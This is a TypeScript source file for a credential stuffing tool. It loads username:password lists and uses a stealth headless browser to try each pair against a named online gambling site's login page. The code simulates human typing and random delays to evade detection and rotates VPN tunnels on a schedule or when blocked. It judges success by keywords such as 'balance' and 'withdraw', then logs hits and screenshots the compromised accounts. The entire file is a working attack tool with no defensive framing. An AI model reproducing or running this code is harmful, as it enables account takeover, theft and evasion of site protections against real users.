// login-auto.ts — Credential stuffing automation
// Reads creds.txt (user:pass per line), reuses scanner selectors,
// attempts login per cred with VPN rotation on block/failure.

import { chromium, Page } from 'playwright';
import * as fs from 'fs';
import * as path from 'path';
import { STEALTH_LAUNCH_ARGS, getStealthContextOptions, injectDeepStealth, simulateHuman, humanType, randDelay } from './stealth-utils';
import { scanLogin, ScanResult } from './scanner';
import { rotate, recordSuccess, recordFail, sudoAvailable, PROXY_URL } from './vpn-rotator';

// ─── Types ────────────────────────────────────────────────────────────────────

export interface LoginAttempt {
  url:       string;
  username:  string;
  timestamp: string;
  success:   boolean;
  reason:    string;       // e.g. "redirect", "dashboard_keyword", "error_keyword", "timeout"
  tunnel:    string | null;
  durationMs: number;
}

// ─── Creds loader ─────────────────────────────────────────────────────────────

export function loadCreds(filePath: string = './creds.txt'): Array<{ username: string; password: string }> {
  const raw = fs.readFileSync(filePath, 'utf8');
  const creds: Array<{ username: string; password: string }> = [];

  for (const line of raw.split('\n')) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) continue;

    // Support  user:pass  or  user,pass  or  user|pass
    const sep = trimmed.includes(':') ? ':' : trimmed.includes(',') ? ',' : '|';
    const idx = trimmed.indexOf(sep);
    if (idx === -1) continue;

    const username = trimmed.slice(0, idx).trim();
    const password = trimmed.slice(idx + 1).trim();
    if (username && password) creds.push({ username, password });
  }

  return creds;
}

// ─── Result log ───────────────────────────────────────────────────────────────

const LOGIN_LOG = './login_results.json';

function appendResult(attempt: LoginAttempt): void {
  const logs: LoginAttempt[] = JSON.parse(fs.readFileSync(LOGIN_LOG, 'utf8'));
  logs.push(attempt);
  fs.writeFileSync(LOGIN_LOG, JSON.stringify(logs, null, 2));
}

// ─── Success detection ────────────────────────────────────────────────────────

// Keywords in the URL or page text that indicate a successful login
const SUCCESS_URL_KEYWORDS    = ['dashboard', 'lobby', 'home', 'account', 'member', 'profile', 'welcome', 'portal'];
const SUCCESS_TEXT_KEYWORDS   = ['welcome', 'log out', 'logout', 'my account', 'balance', 'deposit', 'withdraw'];
const FAIL_TEXT_KEYWORDS      = ['invalid', 'incorrect', 'wrong password', 'failed', 'error', 'not found',
                                  'too many', 'blocked', 'suspended', 'captcha'];

async function detectOutcome(page: Page, originalUrl: string): Promise<{ success: boolean; reason: string }> {
  await page.waitForTimeout(randDelay(2000, 4000));

  const currentUrl = page.url().toLowerCase();
  const bodyText   = ((await page.textContent('body')) ?? '').toLowerCase();

  // URL changed away from login page = likely success
  if (currentUrl !== originalUrl.toLowerCase() &&
      !currentUrl.includes('login') && !currentUrl.includes('error')) {
    for (const kw of SUCCESS_URL_KEYWORDS) {
      if (currentUrl.includes(kw)) return { success: true, reason: `url:${kw}` };
    }
    // URL changed but no known success keyword — still likely success
    return { success: true, reason: 'url_changed' };
  }

  for (const kw of SUCCESS_TEXT_KEYWORDS) {
    if (bodyText.includes(kw)) return { success: true, reason: `text:${kw}` };
  }

  for (const kw of FAIL_TEXT_KEYWORDS) {
    if (bodyText.includes(kw)) return { success: false, reason: `fail_text:${kw}` };
  }

  // Still on login page, no clear signal
  return { success: false, reason: 'no_signal' };
}

// ─── Single login attempt ─────────────────────────────────────────────────────

async function attemptLogin(
  page:     Page,
  url:      string,
  selectors: ScanResult['selectors'],
  username: string,
  password: string
): Promise<{ success: boolean; reason: string }> {

  // Build selectors (same robust logic as scanner)
  const usernameEl = selectors.find((s: any) => s.role === 'username_field');
  const passwordEl = selectors.find((s: any) => s.role === 'password_field');
  const submitEl   = selectors.find((s: any) => s.role === 'submit_button');

  const buildSel = (el: any, fallback: string): string => {
    if (el?.id)   return `#${el.id}`;
    if (el?.name) return `[name="${el.name}"]`;
    return fallback;
  };

  const usernameCss = buildSel(usernameEl, 'input[type="email"], input[type="text"]');
  const passwordCss = buildSel(passwordEl, 'input[type="password"]');
  const submitCss   = buildSel(submitEl,   'button[type="submit"]');

  await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 60000 });
  await page.waitForLoadState('networkidle', { timeout: 15000 }).catch(() => {});
  await simulateHuman(page);

  await humanType(page, usernameCss, username);
  await page.waitForTimeout(randDelay(300, 700));
  await humanType(page, passwordCss, password);
  await page.waitForTimeout(randDelay(200, 600));
  await page.click(submitCss);

  return detectOutcome(page, url);
}

// ─── Is block/rate-limit error? ───────────────────────────────────────────────

function isBlockError(msg: string): boolean {
  const blockPhrases = [
    'ERR_CONNECTION_RESET', 'ERR_CONNECTION_REFUSED', 'ERR_PROXY',
    'net::ERR', 'timeout', 'TIMEOUT'
  ];
  return blockPhrases.some(p => msg.includes(p));
}

// ─── Main automation loop ─────────────────────────────────────────────────────

export async function runLoginAuto(
  targetUrl:  string = 'https://joefortunepokies.win/login',
  credsFile:  string = './creds.txt',
  options: {
    delayBetweenMs?: [number, number]; // [min, max] delay between attempts
    rotateEvery?:    number;            // rotate VPN every N attempts
    stopOnSuccess?:  boolean;           // stop after first working cred
  } = {}
): Promise<void> {
  const {
    delayBetweenMs = [4000, 10000],
    rotateEvery    = 5,
    stopOnSuccess  = false,
  } = options;

  if (!targetUrl.startsWith('http')) targetUrl = 'https://' + targetUrl;

  // ── Load creds ──────────────────────────────────────────────────────────────
  const creds = loadCreds(credsFile);
  if (creds.length === 0) {
    console.error(`[auto] No creds found in ${credsFile}. Add lines in format: username:password`);
    return;
  }
  console.log(`[auto] Loaded ${creds.length} credential(s) from ${credsFile}`);

  // ── Get selectors from scan_results.json (most recent with selectors) ───────
  let selectors: ScanResult['selectors'] = [];
  const scanLog: ScanResult[] = JSON.parse(fs.readFileSync('./scan_results.json', 'utf8'));
  const withSelectors = scanLog.filter(r => r.url === targetUrl && r.selectors.length > 0);

  if (withSelectors.length > 0) {
    selectors = withSelectors[withSelectors.length - 1].selectors;
    console.log(`[auto] Reusing ${selectors.length} selector(s) from previous scan`);
  } else {
    console.log(`[auto] No cached selectors for ${targetUrl} — running scanner first...`);
    const scanResult = await scanLogin(targetUrl);
    if (scanResult.selectors.length === 0) {
      console.error('[auto] Scanner found no selectors. Cannot proceed with login automation.');
      console.error('[auto] Ensure VPN is working and the scanner can reach the page.');
      return;
    }
    selectors = scanResult.selectors;
    console.log(`[auto] Scanner found ${selectors.length} selector(s)`);
  }

  // ── VPN init ────────────────────────────────────────────────────────────────
  const hasSudo = sudoAvailable();
  if (!hasSudo) {
    console.warn('[auto] sudo not pre-authorised — VPN rotation disabled. Run: sudo -v');
    console.warn('[auto] Continuing without VPN rotation...');
  }

  let activeTunnelName: string | null = null;
  const failedTunnels = new Set<string>();

  async function ensureVpn(): Promise<string | null> {
    if (!hasSudo) return null;
    try {
      activeTunnelName = await rotate(failedTunnels);
      return activeTunnelName;
    } catch (e: any) {
      console.error('[auto] VPN rotation failed:', e.message);
      return null;
    }
  }

  // Initial VPN setup
  await ensureVpn();

  // ── Stat tracking ────────────────────────────────────────────────────────────
  let attempted = 0;
  let succeeded = 0;
  const hits: LoginAttempt[] = [];

  // ── Loop through creds ──────────────────────────────────────────────────────
  for (let i = 0; i < creds.length; i++) {
    const { username, password } = creds[i];

    // Rotate VPN every N attempts
    if (hasSudo && attempted > 0 && attempted % rotateEvery === 0) {
      console.log(`[auto] Rotating VPN after ${rotateEvery} attempts...`);
      if (activeTunnelName) failedTunnels.add(activeTunnelName); // force rotation to new tunnel
      await ensureVpn();
    }

    const proxyUrl = activeTunnelName ? PROXY_URL : (process.env.PROXY_URL || undefined);

    console.log(`\n[auto] [${i + 1}/${creds.length}] ${username} | tunnel: ${activeTunnelName ?? 'none'}`);

    const browser = await chromium.launch({
      headless: true,
      args: STEALTH_LAUNCH_ARGS,
      ignoreHTTPSErrors: true as any,
    } as any);

    const context = await browser.newContext({
      ...getStealthContextOptions(proxyUrl),
      ignoreHTTPSErrors: true as any,
    } as any);

    const page = await context.newPage();
    await injectDeepStealth(page, `login-${username}-${Date.now()}`);

    const t0 = Date.now();
    let attempt: LoginAttempt = {
      url:        targetUrl,
      username,
      timestamp:  new Date().toISOString(),
      success:    false,
      reason:     '',
      tunnel:     activeTunnelName,
      durationMs: 0,
    };

    try {
      const outcome = await attemptLogin(page, targetUrl, selectors, username, password);
      attempt.success    = outcome.success;
      attempt.reason     = outcome.reason;
      attempt.durationMs = Date.now() - t0;

      if (outcome.success) {
        console.log(`[auto] ✓ HIT: ${username}:${password} (${outcome.reason})`);
        if (activeTunnelName) recordSuccess(activeTunnelName, attempt.durationMs);
        succeeded++;
        hits.push(attempt);
        await page.screenshot({ path: `./hit_${username.replace(/[^a-z0-9]/gi, '_')}_${Date.now()}.png`, fullPage: true });
      } else {
        console.log(`[auto] ✗ miss: ${username} (${outcome.reason})`);
      }

    } catch (err: any) {
      console.error(`[auto] error on ${username}: ${err.message?.split('\n')[0]}`);
      attempt.reason     = err.message?.split('\n')[0] ?? 'unknown_error';
      attempt.durationMs = Date.now() - t0;

      if (isBlockError(err.message ?? '')) {
        console.warn('[auto] Block/connection error — rotating VPN...');
        if (activeTunnelName) {
          recordFail(activeTunnelName);
          failedTunnels.add(activeTunnelName);
        }
        await ensureVpn();
      }
    }

    appendResult(attempt);
    await browser.close();
    attempted++;

    if (stopOnSuccess && succeeded > 0) {
      console.log(`\n[auto] stopOnSuccess=true — stopping after first hit`);
      break;
    }

    // Human-like delay between attempts
    if (i < creds.length - 1) {
      const delay = randDelay(delayBetweenMs[0], delayBetweenMs[1]);
      console.log(`[auto] Waiting ${(delay / 1000).toFixed(1)}s before next attempt...`);
      await new Promise(r => setTimeout(r, delay));
    }
  }

  // ── Summary ─────────────────────────────────────────────────────────────────
  console.log(`\n${'─'.repeat(54)}`);
  console.log(`[auto] Done. ${attempted} attempted | ${succeeded} hit(s)`);
  if (hits.length > 0) {
    console.log('[auto] Successful credentials:');
    for (const h of hits) {
      console.log(`  ✓  ${h.username}  (${h.reason}, ${h.durationMs}ms)`);
    }
  }
  console.log(`[auto] Results saved to ${LOGIN_LOG}`);
  console.log(`${'─'.repeat(54)}\n`);
}

// ── Allow direct execution ────────────────────────────────────────────────────
if (require.main === module) {
  const url = process.argv[2] || 'https://joefortunepokies.win/login';
  runLoginAuto(url).catch(e => { console.error(e); process.exit(1); });
}
